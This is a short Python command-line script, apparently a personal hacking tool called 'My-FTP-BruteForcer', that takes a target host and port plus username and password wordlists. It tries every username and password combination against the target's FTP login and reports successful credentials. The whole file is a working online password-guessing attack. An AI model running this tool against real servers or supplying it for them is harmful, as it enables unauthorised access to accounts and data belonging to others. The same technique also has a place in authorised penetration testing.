#!/usr/bin/python
############################################################
# Requirements:
# pip install termcolor
############################################################

from termcolor import colored
import datetime
import argparse
import ftplib


NAME = "My-FTP-BruteForcer "
VERSION = "1.0"
DATE = "02/06/2024"


def print_banner():
    """Print the banner."""
    print("")
    print(f"### {NAME}")
    print(f"### Version {VERSION}")
    print(f"### Date {DATE}")
    print("### by Bruno Botelho - bruno.botelho.br@gmail.com")
    print("")


def log_timestamp():
    """Return the current timestamp."""
    return datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")


def parse_arguments():
    """Parse and return arguments from the command line."""
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-t",
        "--target",
        action="store",
        required=True,
        dest="target",
        help="[Required] Target IP address or hostname.",
    )
    parser.add_argument(
        "-p",
        "--port",
        action="store",
        required=False,
        dest="port",
        help="Port to connect to. Default is 21.",
        default=21,
    )
    parser.add_argument(
        "-U",
        "--user-list",
        action="store",
        required=True,
        dest="user_list",
        help="[Required] File containing usernames to test.",
    )
    parser.add_argument(
        "-P",
        "--password-list",
        action="store",
        required=True,
        dest="password_list",
        help="[Required] File containing passwords to test.",
    )
    return parser.parse_args()


def main():
    """Main function."""
    args = parse_arguments()
    print_banner()
    print(log_timestamp() + " Target: " + args.target)
    print(log_timestamp() + " Port: " + str(args.port))
    print(log_timestamp() + " User list: " + args.user_list)
    print(log_timestamp() + " Password list: " + args.password_list)

    users = []
    passwords = []
    try:
        with open(args.user_list, "r") as f:  # type: ignore
            users = f.readlines()
    except Exception as e:
        print(log_timestamp() + " Error reading user list file: " + str(e))
        return

    try:
        with open(args.password_list, "r") as f:  # type: ignore
            passwords = f.readlines()
    except Exception as e:
        print(log_timestamp() + " Error reading password list file: " + str(e))
        return

    total_attempts = len(users) * len(passwords)
    print(log_timestamp() + " Total attempts: " + str(total_attempts))
    c = 0
    for user in users:
        for password in passwords:
            c = c + 1
            print(
                log_timestamp()
                + " Trying "
                + user.strip()
                + ":"
                + password.strip()
                + " Attempt "
                + str(c)
                + " of "
                + str(total_attempts)
            )
            try:
                ftp = ftplib.FTP()
                ftp.connect(args.target, args.port)
                ftp.login(user.strip(), password.strip())
                print(
                    log_timestamp()
                    + colored(f" Success! {user.strip()}:{password.strip()}", "green")
                )
                ftp.quit()
            except Exception as e:  # type: ignore
                print(log_timestamp() + colored(" Fail: " + str(e), "red"))
    print(log_timestamp() + " Finished.")


if __name__ == "__main__":
    main()
